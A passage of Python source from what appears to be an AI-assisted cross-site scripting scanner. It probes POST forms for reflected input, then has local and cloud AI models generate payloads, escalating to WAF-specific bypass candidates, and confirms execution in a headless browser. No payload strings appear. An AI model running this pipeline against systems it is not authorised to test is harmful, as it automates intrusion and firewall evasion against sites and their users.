            dedup_registry=dedup_registry,
            dedup_lock=dedup_lock,
            findings_lock=findings_lock,
            start_time=start_time,
            put_result=_put_result,
            auth_headers=auth_headers,
            crawled_pages=crawled_pages,
            sink_url=sink_url,
            ai_backend=ai_backend,
            cli_tool=cli_tool,
            cli_model=cli_model,
            cloud_attempts=cloud_attempts,
        )
    except Exception as exc:
        log.exception("POST worker crashed for %s", post_form.action_url)
        _put_result(WorkerResult(
            url=post_form.action_url, status="error", error=str(exc)
        ))


def _run_post(
    *,
    post_form: "PostFormTarget",
    rate: float,
    waf_hint: str | None,
    model: str,
    cloud_model: str,
    use_cloud: bool,
    timeout_seconds: int,
    dedup_registry: "DictProxy",
    dedup_lock: Any,
    findings_lock: Any,
    start_time: float,
    put_result: Any,
    auth_headers: dict[str, str] | None = None,
    crawled_pages: list[str] | None = None,
    sink_url: str | None = None,
    ai_backend: str = "api",
    cli_tool: str = "claude",
    cli_model: str | None = None,
    cloud_attempts: int = 1,
) -> None:
    from ai_xss_generator.probe import probe_post_form
    from ai_xss_generator.active.executor import ActiveExecutor
    from ai_xss_generator.active.transforms import all_variants_for_probe
    from ai_xss_generator.parser import parse_target as _parse_target

    deadline = start_time + active_worker_timeout_budget(
        timeout_seconds,
        use_cloud,
        ai_backend,
        cloud_attempts=cloud_attempts,
    )
    local_model_timeout_seconds = _ACTIVE_LOCAL_MODEL_TIMEOUT_SECONDS

    def _timed_out() -> bool:
        return time.monotonic() > deadline

    if not post_form.param_names:
        put_result(WorkerResult(url=post_form.action_url, status="no_params", waf=waf_hint))
        return

    # Probe all params for reflection
    probe_results = probe_post_form(
        action_url=post_form.action_url,
        source_page_url=post_form.source_page_url,
        param_names=post_form.param_names,
        csrf_field=post_form.csrf_field,
        hidden_defaults=post_form.hidden_defaults,
        rate=rate,
        waf=waf_hint,
        auth_headers=auth_headers,
        crawled_pages=crawled_pages,
        sink_url=sink_url,
    )

    injectable = [r for r in probe_results if r.is_injectable]
    reflected  = [r for r in probe_results if r.is_reflected]

    _cached_context: Any = None
    try:
        _cached_context = _parse_target(
            url=post_form.source_page_url,
            html_value=None,
            waf=waf_hint,
            auth_headers=auth_headers,
        )
    except Exception as exc:
        log.debug("Pre-parse of form source %s failed: %s", post_form.source_page_url, exc)

    post_session_lessons: list[Any] = []
    target_disposition: Any = None
    try:
        from ai_xss_generator.behavior import (
            attach_behavior_profile,
            build_target_behavior_profile,
            classify_target_disposition,
        )
        from ai_xss_generator.learning import build_memory_profile
        from ai_xss_generator.lessons import (
            build_behavior_lessons,
            build_mapping_lessons,
            build_probe_lessons,
        )

        behavior_profile = build_target_behavior_profile(
            url=post_form.action_url,
            delivery_mode="post",
            waf_name=waf_hint,
            auth_required=bool(auth_headers),
            context=_cached_context,
            probe_results=probe_results,
        )
        _cached_context = attach_behavior_profile(_cached_context, behavior_profile)
        target_disposition = classify_target_disposition(
            _cached_context,
            delivery_mode="post",
            reflected_params=len(reflected),
            injectable_params=len(injectable),
        )

        memory_profile = build_memory_profile(
            context=_cached_context,
            waf_name=waf_hint,
            delivery_mode="post",
            target_host=urllib.parse.urlparse(post_form.action_url).netloc,
        )
        if auth_headers:
            memory_profile["auth_required"] = True
        post_session_lessons.extend(build_behavior_lessons(behavior_profile))
        if _cached_context is not None:
            post_session_lessons.extend(build_mapping_lessons(
                _cached_context,
                memory_profile=memory_profile,
            ))
        if reflected:
            post_session_lessons.extend(build_probe_lessons(
                reflected,
                memory_profile=memory_profile,
                delivery_mode="post",
            ))
    except Exception as exc:
        log.debug("POST lesson build failed for %s: %s", post_form.action_url, exc)

    if not reflected:
        put_result(WorkerResult(
            url=post_form.action_url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(post_form.param_names),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "No reflection was confirmed during bounded discovery."
            ),
            target_tier=getattr(target_disposition, "tier", "hard_dead"),
        ))
        return

    if not injectable:
        put_result(WorkerResult(
            url=post_form.action_url,
            status="no_reflection",
            waf=waf_hint,
            params_tested=len(post_form.param_names),
            params_reflected=len(reflected),
            dead_target=True,
            dead_reason=(
                getattr(target_disposition, "reason", "")
                or "Reflection exists, but no executable context was confirmed."
            ),
            target_tier=getattr(target_disposition, "tier", "soft_dead"),
        ))
        return

    # Start Playwright executor
    executor = ActiveExecutor(auth_headers=auth_headers)
    try:
        executor.start()
    except Exception as exc:
        put_result(WorkerResult(
            url=post_form.action_url, status="error",
            error=f"Playwright start failed: {exc}", waf=waf_hint,
            target_tier=getattr(target_disposition, "tier", ""),
        ))
        return

    confirmed_findings: list[ConfirmedFinding] = []
    total_transforms_tried = 0
    cloud_escalated = False
    local_model_rounds = 0
    cloud_model_rounds = 0
    fallback_rounds = 0
    escalation_reasons: list[str] = []

    try:
        for probe_result in injectable:
            if _timed_out():
                break

            param_name = probe_result.param_name
            param_variants = all_variants_for_probe(probe_result)

            for _pname, context_type, variants in param_variants:
                if _timed_out():
                    break

                context_probe_result = _probe_result_for_context(probe_result, context_type)
                from ai_xss_generator.behavior import derive_ai_escalation_policy

                escalation_policy = derive_ai_escalation_policy(
                    _cached_context,
                    delivery_mode="post",
                    context_type=context_type,
                )
                _append_reason(escalation_reasons, escalation_policy.note)
                cloud_plan = CloudPayloadPlan()
                context_confirmed = False

                if escalation_policy.use_local and not context_confirmed and not _timed_out():
                    local_model_rounds += 1
                    local_payloads = _get_local_payloads(
                        url=post_form.source_page_url,
                        probe_result=context_probe_result,
                        model=model,
                        waf=waf_hint,
                        base_context=_cached_context,
                        auth_headers=auth_headers,
                        delivery_mode="post",
                        session_lessons=post_session_lessons,
                        local_timeout_seconds=min(
                            local_model_timeout_seconds,
                            escalation_policy.local_timeout_seconds,
                        ),
                    )

                    for lp in local_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire_post(
                            source_page_url=post_form.source_page_url,
                            action_url=post_form.action_url,
                            param_name=param_name,
                            payload=_payload_text(lp),
                            all_param_names=post_form.param_names,
                            csrf_field=post_form.csrf_field,
                            transform_name="local_model",
                            sink_url=sink_url,
                            payload_candidate=lp,
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=post_form.action_url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="local_model",
                                cloud_escalated=False,
                                ai_note=escalation_policy.note,
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

                if not context_confirmed and use_cloud and not _timed_out():
                    surviving_chars = frozenset().union(
                        *(ctx.surviving_chars for ctx in context_probe_result.reflections)
                    )
                    ekey = _escalation_key(
                        url=post_form.action_url,
                        param_name=param_name,
                        waf=waf_hint,
                        surviving_chars=surviving_chars,
                        context_type=context_type,
                    )
                    cloud_feedback_lessons: list[Any] | None = None
                    seen_cloud_payloads: set[str] = set()

                    for attempt_number in range(1, max(1, cloud_attempts) + 1):
                        if _timed_out():
                            break

                        cloud_escalated = True
                        cloud_model_rounds += 1
                        cloud_plan = _coerce_cloud_plan(_get_cloud_payloads(
                            url=post_form.source_page_url,
                            probe_result=context_probe_result,
                            cloud_model=cloud_model,
                            waf=waf_hint,
                            ekey=ekey,
                            dedup_registry=dedup_registry,
                            dedup_lock=dedup_lock,
                            base_context=_cached_context,
                            auth_headers=auth_headers,
                            ai_backend=ai_backend,
                            cli_tool=cli_tool,
                            cli_model=cli_model,
                            delivery_mode="post",
                            session_lessons=post_session_lessons,
                            feedback_lessons=cloud_feedback_lessons,
                        ))
                        cloud_payloads, duplicate_payloads = _unique_new_payloads(
                            cloud_plan.payloads,
                            seen_cloud_payloads,
                        )

                        failed_results: list[Any] = []
                        for cp in cloud_payloads:
                            if _timed_out():
                                break
                            total_transforms_tried += 1
                            result = executor.fire_post(
                                source_page_url=post_form.source_page_url,
                                action_url=post_form.action_url,
                                param_name=param_name,
                                payload=_payload_text(cp),
                                all_param_names=post_form.param_names,
                                csrf_field=post_form.csrf_field,
                                transform_name="cloud_model",
                                sink_url=sink_url,
                                payload_candidate=cp,
                            )
                            if result.confirmed:
                                finding = _make_finding(
                                    url=post_form.action_url,
                                    probe_result=context_probe_result,
                                    context_type=context_type,
                                    result=result,
                                    waf=waf_hint,
                                    source="cloud_model",
                                    cloud_escalated=True,
                                    ai_engine=cloud_plan.engine,
                                    ai_note=_merge_ai_notes(
                                        escalation_policy.note,
                                        _cloud_attempt_note(
                                            cloud_plan.note,
                                            attempt_number,
                                            max(1, cloud_attempts),
                                        ),
                                    ),
                                )
                                confirmed_findings.append(finding)
                                context_confirmed = True
                                break
                            failed_results.append(result)

                        if context_confirmed or attempt_number >= max(1, cloud_attempts):
                            break

                        cloud_feedback_lessons = _build_cloud_feedback_lessons(
                            attempt_number=attempt_number,
                            total_attempts=max(1, cloud_attempts),
                            prompt_context=_cached_context,
                            delivery_mode="post",
                            context_type=context_type,
                            sink_context=context_type,
                            payloads_tried=cloud_payloads,
                            duplicate_payloads=duplicate_payloads,
                            observation=_summarize_failed_execution_results(failed_results),
                        )

                if not context_confirmed and waf_hint and not _timed_out():
                    waf_payloads = _waf_reference_payloads(waf_hint, context_probe_result, limit=4)
                    if waf_payloads:
                        fallback_rounds += 1
                        _append_reason(
                            escalation_reasons,
                            f"Inserted bounded {waf_hint} WAF-specific fallback candidates before generic transforms.",
                        )
                    for wp in waf_payloads:
                        if _timed_out():
                            break
                        total_transforms_tried += 1
                        result = executor.fire_post(
                            source_page_url=post_form.source_page_url,
                            action_url=post_form.action_url,
                            param_name=param_name,
                            payload=_payload_text(wp),
                            all_param_names=post_form.param_names,
                            csrf_field=post_form.csrf_field,
                            transform_name="waf_payload",
                            sink_url=sink_url,
                            payload_candidate=wp,
                        )
                        if result.confirmed:
                            finding = _make_finding(
                                url=post_form.action_url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_waf_fallback",
                                cloud_escalated=cloud_escalated,
                                ai_note=f"Bounded {waf_hint} WAF-specific fallback candidate confirmed execution.",
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

                if not context_confirmed and not _timed_out():
                    fallback_rounds += 1
                    for variant in variants:
                        if _timed_out():
                            break

                        total_transforms_tried += 1
                        result = executor.fire_post(
                            source_page_url=post_form.source_page_url,
                            action_url=post_form.action_url,
                            param_name=param_name,
                            payload=variant.payload,
                            all_param_names=post_form.param_names,
                            csrf_field=post_form.csrf_field,
                            transform_name=variant.transform_name,
                            sink_url=sink_url,
                        )

                        if result.confirmed:
                            finding = _make_finding(
                                url=post_form.action_url,
                                probe_result=context_probe_result,
                                context_type=context_type,
                                result=result,
                                waf=waf_hint,
                                source="phase1_transform",
                                cloud_escalated=False,
                                ai_note=_merge_ai_notes(
                                    escalation_policy.note,
                                    cloud_plan.note if use_cloud else "",
                                ),
                            )
                            confirmed_findings.append(finding)
                            context_confirmed = True
                            break

    finally:
        executor.stop()

    status = "confirmed" if confirmed_findings else "no_execution"
    put_result(WorkerResult(
        url=post_form.action_url,
        status=status,
        confirmed_findings=confirmed_findings,
        transforms_tried=total_transforms_tried,
        cloud_escalated=cloud_escalated,
        waf=waf_hint,
        params_tested=len(post_form.param_names),
        params_reflected=len(reflected),
        kind="post",
        target_tier=getattr(target_disposition, "tier", "live"),
        local_model_rounds=local_model_rounds,
        cloud_model_rounds=cloud_model_rounds,
        fallback_rounds=fallback_rounds,
        escalation_reasons=escalation_reasons,
    ))
